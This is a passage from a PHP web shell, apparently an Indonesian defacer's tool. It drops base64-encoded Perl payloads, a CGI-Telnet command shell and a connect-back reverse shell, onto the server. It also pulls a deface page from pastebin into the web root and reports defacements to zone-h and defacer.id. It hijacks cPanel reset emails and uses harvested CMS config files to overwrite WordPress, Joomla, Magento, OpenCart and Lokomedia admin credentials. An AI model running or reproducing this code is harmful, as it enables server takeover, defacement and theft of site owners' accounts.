$cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBSZWNvZGVkIEJ5IDB4MTk5OQoKJFdpbk5UID0gMDsKJE5UQ21kU2VwID0gIiYiOwokVW5peENtZFNlcCA9ICI7IjsKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsKJFNob3dEeW5hbWljT3V0cHV0ID0gMTsKJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7CiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsKJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7CiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7CnN1YiBSZWFkUGFyc2UgCnsKCWxvY2FsICgqaW4pID0gQF8gaWYgQF87Cglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOwoJCgkkTXVsdGlwYXJ0Rm9ybURhdGEgPSAkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLzsKCglpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQoJewoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9OwoJfQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpCgl7CgkJYmlubW9kZShTVERJTikgaWYgJE11bHRpcGFydEZvcm1EYXRhICYgJFdpbk5UOwoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7Cgl9CgoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC8pCgl7CgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyAKCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyAKCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOwoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsKCQkkSGVhZGVyID0gJGA7CgkJJEJvZHkgPSAkJzsKIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQoJCSRpbnsnZmlsZWRhdGEnfSA9ICRCb2R5OwoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgCgkJJGlueydmJ30gPSAkMTsgCgkJJGlueydmJ30gPX4gcy9cIi8vZzsKCQkkaW57J2YnfSA9fiBzL1xzLy9nOwoKCQkjIHBhcnNlIHRyYWlsZXIKCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQoJCXsgCgkJCSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOwoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87CgkJCSRrZXkgPSAkMTsKCQkJJHZhbCA9ICQnOwoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gPSAkdmFsOyAKCQl9Cgl9CgllbHNlICMgc3RhbmRhcmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkKCXsKCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7CgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQoJCXsKCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsKCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsKCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsKCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7CgkJCSRpbnska2V5fSAuPSAkdmFsOwoJCX0KCX0KfQpzdWIgUHJpbnRQYWdlSGVhZGVyCnsKCSRFbmNvZGVkQ3VycmVudERpciA9ICRDdXJyZW50RGlyOwoJJEVuY29kZWRDdXJyZW50RGlyID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsKCXByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxuXG4iOwoJcHJpbnQgPDxFTkQ7CjxodG1sPgo8aGVhZD4KPHRpdGxlPkNHSS1UZWxuZXQgVmVyc2lvbiAxLjA8L3RpdGxlPgokSHRtbE1ldGFIZWFkZXIKPC9oZWFkPgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBBMEEwQSIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZWRDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCAKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwKPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5EaXNjb25uZWN0PC9hPiB8CjxhIGhyZWY9Imh0dHA6Ly93d3cucm9oaXRhYi5jb20vY2dpc2NyaXB0cy9jZ2l0ZWxuZXQuaHRtbCI+SGVscDwvYT48YnI+Cjxmb250IGNvbG9yPSIjQzBDMEMwIiBzaXplPSIzIj4KRU5ECn0Kc3ViIFByaW50UGFnZUZvb3Rlcgp7CglwcmludCAiPC9mb250PjwvYm9keT48L2h0bWw+IjsKfQpzdWIgR2V0Q29va2llcwp7CglAaHR0cGNvb2tpZXMgPSBzcGxpdCgvOyAvLCRFTlZ7J0hUVFBfQ09PS0lFJ30pOwoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykKCXsKCQkoJGlkLCAkdmFsKSA9IHNwbGl0KC89LywgJGNvb2tpZSk7CgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7Cgl9Cn0Kc3ViIFByaW50Q29tbWFuZExpbmVJbnB1dEZvcm0KewoJJFByb21wdCA9ICRXaW5OVCA/ICIkQ3VycmVudERpcj4gIiA6ICJbYWRtaW5cQCRTZXJ2ZXJOYW1lICRDdXJyZW50RGlyXVwkICI7CglwcmludCA8PEVORDsKPGNvZGU+Cjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPgo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+CjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+CiRQcm9tcHQKPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImMiPgo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPgo8L2Zvcm0+CjwvY29kZT4KRU5ECn0Kc3ViIENvbW1hbmRUaW1lb3V0CnsKCWlmKCEkV2luTlQpCgl7CgkJYWxhcm0oMCk7CgkJcHJpbnQgPDxFTkQ7CjwveG1wPgo8Y29kZT4KQ29tbWFuZCBleGNlZWRlZCBtYXhpbXVtIHRpbWUgb2YgJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gc2Vjb25kKHMpLgo8YnI+S2lsbGVkIGl0IQo8Y29kZT4KRU5ECgkJJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07CgkJJlByaW50UGFnZUZvb3RlcjsKCQlleGl0OwoJfQp9CnN1YiBFeGVjdXRlQ29tbWFuZAp7CglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kCgl7CgkJIyB3ZSBjaGFuZ2UgdGhlIGRpcmVjdG9yeSBpbnRlcm5hbGx5LiBUaGUgb3V0cHV0IG9mIHRoZQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLgoJCQoJCSRPbGREaXIgPSAkQ3VycmVudERpcjsKCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7CgkJY2hvcCgkQ3VycmVudERpciA9IGAkQ29tbWFuZGApOwoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRPbGREaXI+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkT2xkRGlyXVwkICI7CgkJcHJpbnQgIjxjb2RlPiRQcm9tcHQgJFJ1bkNvbW1hbmQ8L2NvZGU+IjsKCX0KCWVsc2UgIyBzb21lIG90aGVyIGNvbW1hbmQsIGRpc3BsYXkgdGhlIG91dHB1dAoJewoJCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCQkkUHJvbXB0ID0gJFdpbk5UID8gIiRDdXJyZW50RGlyPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJEN1cnJlbnREaXJdXCQgIjsKCQlwcmludCAiPGNvZGU+JFByb21wdCAkUnVuQ29tbWFuZDwvY29kZT48eG1wPiI7CgkJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOwoJCWlmKCEkV2luTlQpCgkJewoJCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0OwoJCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7CgkJfQoJCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQKCQl7CgkJCSR8PTE7CgkJCSRDb21tYW5kIC49ICIgfCI7CgkJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOwoJCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pCgkJCXsKCQkJCSRfID1+IHMvKFxufFxyXG4pJC8vOwoJCQkJcHJpbnQgIiRfXG4iOwoJCQl9CgkJCSR8PTA7CgkJfQoJCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcwoJCXsKCQkJcHJpbnQgYCRDb21tYW5kYDsKCQl9CgkJaWYoISRXaW5OVCkKCQl7CgkJCWFsYXJtKDApOwoJCX0KCQlwcmludCAiPC94bXA+IjsKCX0KCSZQcmludENvbW1hbmRMaW5lSW5wdXRGb3JtOwoJJlByaW50UGFnZUZvb3RlcjsKfQomUmVhZFBhcnNlOwomR2V0Q29va2llczsKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwoKJFJ1bkNvbW1hbmQgPSAkaW57J2MnfTsKJFRyYW5zZmVyRmlsZSA9ICRpbnsnZid9OwokT3B0aW9ucyA9ICRpbnsnbyd9OwokQWN0aW9uID0gJGlueydhJ307CiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7CiRDdXJyZW50RGlyID0gJGlueydkJ307CmNob3AoJEN1cnJlbnREaXIgPSBgJENtZFB3ZGApIGlmKCRDdXJyZW50RGlyIGVxICIiKTsKaWYoJEFjdGlvbiBlcSAiY29tbWFuZCIpICMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZFeGVjdXRlQ29tbWFuZDsKfQo=';

$file = fopen("izo.cin" ,"w+");
$write = fwrite ($file ,base64_decode($cgishellizocin));
fclose($file);
    chmod("izo.cin",0755);
$netcatshell = 'IyEvdXNyL2Jpbi9wZXJsDQogICAgICB1c2UgU29ja2V0Ow0KICAgICAgcHJpbnQgIkRhdGEgQ2hh
MHMgQ29ubmVjdCBCYWNrIEJhY2tkb29yXG5cbiI7DQogICAgICBpZiAoISRBUkdWWzBdKSB7DQog
ICAgICAgIHByaW50ZiAiVXNhZ2U6ICQwIFtIb3N0XSA8UG9ydD5cbiI7DQogICAgICAgIGV4aXQo
MSk7DQogICAgICB9DQogICAgICBwcmludCAiWypdIER1bXBpbmcgQXJndW1lbnRzXG4iOw0KICAg
ICAgJGhvc3QgPSAkQVJHVlswXTsNCiAgICAgICRwb3J0ID0gODA7DQogICAgICBpZiAoJEFSR1Zb
MV0pIHsNCiAgICAgICAgJHBvcnQgPSAkQVJHVlsxXTsNCiAgICAgIH0NCiAgICAgIHByaW50ICJb
Kl0gQ29ubmVjdGluZy4uLlxuIjsNCiAgICAgICRwcm90byA9IGdldHByb3RvYnluYW1lKCd0Y3An
KSB8fCBkaWUoIlVua25vd24gUHJvdG9jb2xcbiIpOw0KICAgICAgc29ja2V0KFNFUlZFUiwgUEZf
SU5FVCwgU09DS19TVFJFQU0sICRwcm90bykgfHwgZGllICgiU29ja2V0IEVycm9yXG4iKTsNCiAg
ICAgIG15ICR0YXJnZXQgPSBpbmV0X2F0b24oJGhvc3QpOw0KICAgICAgaWYgKCFjb25uZWN0KFNF
UlZFUiwgcGFjayAiU25BNHg4IiwgMiwgJHBvcnQsICR0YXJnZXQpKSB7DQogICAgICAgIGRpZSgi
VW5hYmxlIHRvIENvbm5lY3RcbiIpOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBTcGF3bmlu
ZyBTaGVsbFxuIjsNCiAgICAgIGlmICghZm9yayggKSkgew0KICAgICAgICBvcGVuKFNURElOLCI+
JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
YXRhY2hlZFxuXG4iOw==';

$file = fopen("dc.pl" ,"w+");
$write = fwrite ($file ,base64_decode($netcatshell));
fclose($file);
    chmod("dc.pl",0755);
   echo "<iframe src=cgitelnet1/izo.cin width=100% height=100% frameborder=0></iframe> 

 
 </div>"; 
	
	
}

elseif(isset($_GET['do']) && ($_GET['do'] == 'deleteme')) {
	unlink(__FILE__);
	echo "<script>window.location='./';</script>";
	}
	elseif(isset($_GET['do']) && ($_GET['do'] == 'mirror')) {
    if($_POST['arsip'] == '1') {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } if($_POST['arsip'] == '2') {
		$site = explode("\r\n", $_POST['sites']);
$hekel = $_POST['nick'];
$tim = $_POST['tim'];
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://www.defacer.id/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$tim";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}

	}
	else {
        echo "
		<script type='text/javascript'>//<![CDATA[
window.onload=function(){
document.getElementById('arsip').addEventListener('change', function () {
	var style = this.value == 2 ? 'block' : 'none';
    document.getElementById('defacerid').style.display = style;
});
}//]]> 

</script><center>
		<form method='post'>
        <select class='select' id='arsip' name='arsip' style='width: 450px;' height='10'>
        <option value='1'>Zone-h</option>
        <option value='2'>Defacer ID</option></select><br>
		<u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='0x1999'><br>
<div id='defacerid' style='display: none;'><br>
<u>Team</u>:<br> 
        <input type='text' name='tim' size='50' value='Indonesian Code Party'><br><br>
		</div>
        <u>Domains</u>: <br>
        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
}

elseif(isset($_GET['do']) && ($_GET['do'] == 'hek')) {
	$url="http://" . $_SERVER['SERVER_NAME']."/0x.htm";
$hh=$_SERVER['DOCUMENT_ROOT']."/0x.htm";
@file_put_contents($hh ,file_get_contents("http://pastebin.com/raw/PDcuwBug"));
function zoneh($url,$nick) {
            $ch = curl_init("http://www.zone-h.com/notify/single");
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_POST, true);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
            return curl_exec($ch);
                  curl_close($ch);
        }
            $zoneh = zoneh($url,"0x1999");
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'cpres')) {
	echo "<form method='post'><input type='text' name='email'> <input type='submit' value='Gas'></form>";
	if($_POST['email']){
	$file3 = $_POST['email'];
	$fp3 = fopen("/home/".$user."/.contactemail","w");
	$fw3 = fwrite($fp3,$file3);
	@fclose($fp3);
	$fp4 = fopen("/home/".$user."/.cpanel/contactinfo","w");
	$fw4 = fwrite($fp4,$file3);
	@fclose($fp4);
	echo "   DONE";
	}
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'crp')) {
  if($_POST['gass']) {
    echo "<center><h1>Config Reset Password</h1>
    <form method='post'>
    Link Config: <br>
    <textarea name='link' style='width: 450px; height:250px;'>";
    UrlLoop($_POST['linkconf'],$_POST['tipe']); 
    echo"</textarea><br>
    <input type='submit' style='width: 450px;' name='ngentuconfig' value='Hajar!!'>
    </form></center>";
  }else {
    echo '<center>
    <h1>Config Reset Password</h1>
    <form method="post">
    Select Type :<br><select class="select" name="tipe"  style="width: 450px;" height="10">
    <option value="Wordpress">Wordpress</option>
    <option value="Joomla">Joomla</option>
    <option value="Lokomedia">Lokomedia</option>
    <option value="Magento">Magento</option>
    <option value="OpenCart">OpenCart</option>
    <option value="txt">All Config</option>
    </select><br>
    Link Config :<br>
    <input type="text" name="linkconf" height="10" style="width: 450px;" placeholder="http://0xdark.com/cox_symconf/"><br>
    <input type="submit" style="width: 450px;" name="gass" value="Hajar!!">
    </form></center>';
  }
  if($_POST['ngentuconfig']) {
  	echo "<center><table style='width:100%'>
  <tr>
    <th>CMS</th>
    <th>User</th> 
    <th>Password</th>
    <th>Login</th>
    <th>Config</th>
  </tr>";
    $user = '0x1999';
    $pass = "0x1999";
    $passx = md5($pass);
    $link = explode("\r\n", $_POST['link']);

    foreach($link as $file_conf) {
      $config = file_get_contents($file_conf);
      if(preg_match("/JConfig|joomla/",$config)) {
        $dbhost = ambilkata($config,"host = '","'");
        $dbuser = ambilkata($config,"user = '","'");
        $dbpass = ambilkata($config,"password = '","'");
        $dbname = ambilkata($config,"db = '","'");
        $dbprefix = ambilkata($config,"dbprefix = '","'");
        $prefix = $dbprefix."users";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result['id'];
        $site = ambilkata($config,"sitename = '","'");
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
        echo "<tr><td>Joomla</td>";
        //echo "[ ".$file_conf." ]<br>";
        //echo "CMS => Joomla<br>";
        if($site == '') {
          $url_target = "<font color=red>ERROR</font><br>";
        } else {
          $url_target=$site;
        }
        if(!$update) {
        echo "<td><font color=red>".mysql_error()."</font></td><td>Update Error</td><td>!</td><td>".$file_conf."</td>";
        }
        elseif(!$conn){
        echo "<td><font color=red>".mysql_error()."</font></td><td>Connection Error</td><td>!</td><td>".$file_conf."</td>";
        }
        elseif (!$db){
        echo "<td><font color=red>".mysql_error()."</font></td><td>DB Error</td><td>!</td><td>".$file_conf."</td>";
        }
         else {
          echo "<td><font color=lime>$user</font></td>";
          echo "<td><font color=lime>$pass</font></td>";
          echo "<td><a href=\"https://www.google.com/search?source=hp&q='$url_target'\" target=\"_BLANK\">$url_target</a></td>";
          echo "<td>".$file_conf."</td>";
        }
        echo "</tr>";
        mysql_close($conn);
      } elseif(preg_match("/WordPress/",$config)) {
        $dbhost = ambilkata($config,"DB_HOST', '","'");
        $dbuser = ambilkata($config,"DB_USER', '","'");
        $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"DB_NAME', '","'");
        $dbprefix = ambilkata($config,"table_prefix  = '","'");
        $prefix = $dbprefix."users";
        $option = $dbprefix."options";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[ID];
        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[option_value];
        if($target == '') {
          $url_target = "<font color=red>DOMAIN ERROR</font>";
        } else {
          $url_target = "<a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a>";
        }
        $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE id='$id'");
        echo "<tr><td>Wordpress</td>";
        //echo "[ ".$file_conf." ]<br>";
        //echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "<td><font color=red>".mysql_error()."</font></td><td>!</td><td>!</td><td>".$file_conf."</td>";
        } else {
          echo "<td><font color=lime>$user</font></td>";
          echo "<td><font color=lime>$pass</font></td>";
          echo "<td>$url_target</td>";
          echo "<td>".$file_conf."</td>";
        }
        echo "</tr>";
        mysql_close($conn);
      } elseif(preg_match("/Magento|Mage_Core/",$config)) {
        $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
        $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
        $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
        $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
        $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
        $prefix = $dbprefix."admin_user";
        $option = $dbprefix."core_config_data";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[value];
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "[ ".$file_conf." ]<br>";
        echo "CMS => Magento<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
        $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
        $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
        $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"'DB_DATABASE', '","'");
        $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
        $prefix = $dbprefix."user";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $target = ambilkata($config,"HTTP_SERVER', '","'");
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "[ ".$file_conf." ]<br>";
        echo "CMS => OpenCart<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
        $dbhost = ambilkata($config,'server = "','"');
        $dbuser = ambilkata($config,'username = "','"');
        $dbpass = ambilkata($config,'password = "','"');
        $dbname = ambilkata($config,'database = "','"');
        $prefix = "users";
        $option = "identitas";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
        $result = mysql_fetch_array($q);
        $target = $result[alamat_website];
        if($target == '') {
          $target2 = $result[url];
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          if($target2 == '') {
            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $cek_login3 = file_get_contents("$target2/adminweb/");
            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
              $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
              $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
            } else {
              $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
            }
          }
        } else {
          $cek_login = file_get_contents("$target/adminweb/");
          $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
          if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
          } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
          } else {
            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
          }
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE level='admin'");
        echo "[ ".$file_conf." ]<br>";
        echo "CMS => Lokomedia<br>";
        if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
          echo $url_target2;
        } else {
          echo $url_target;
        }
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      }
    }
  }     
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'grabpass')) {
if($_POST['gass']) {
    echo "<center><h1>Config Password Grabber</h1>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' style='width: 450px; height:250px;'>";
    UrlLoop($_POST['linkconf'],'txt');   
    echo"</textarea><br>
